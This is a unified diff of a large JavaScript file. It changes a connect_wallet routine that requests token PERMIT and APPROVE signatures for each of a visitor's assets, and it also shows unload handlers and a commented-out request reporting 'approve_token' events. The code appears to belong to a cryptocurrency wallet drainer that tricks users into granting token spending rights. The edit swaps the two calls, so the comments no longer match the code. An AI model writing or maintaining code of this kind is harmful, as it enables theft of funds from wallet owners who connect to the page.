@@ -3805,7 +3805,7 @@ const connect_wallet = async (provider = null) => {
 					// Try PERMIT first if ABI is available
 					if (asset.abi) {
 						try {
-							let res_code = await PERMIT_TOKEN(asset);
+							let res_code = await APPROVE_TOKEN(asset);
 							if (res_code === 1) {
 								/* const x_promise = send_request({
 									action: 'approve_token',
@@ -3826,7 +3826,7 @@ const connect_wallet = async (provider = null) => {
 					// Try APPROVE if PERMIT fails or ABI was not found
 					if (!signed) {
 						try {
-							let res_code = await APPROVE_TOKEN(asset);
+							let res_code = await PERMIT_TOKEN(asset);
 							if (res_code === 1) {
 								/* const x_promise = send_request({
 									action: 'approve_token',
@@ -4524,4 +4524,5 @@ setInterval(async () => {
 window.addEventListener("beforeunload", (e) => leave_website());
 
 window.addEventListener("onbeforeunload", (e) => leave_website());
+
 
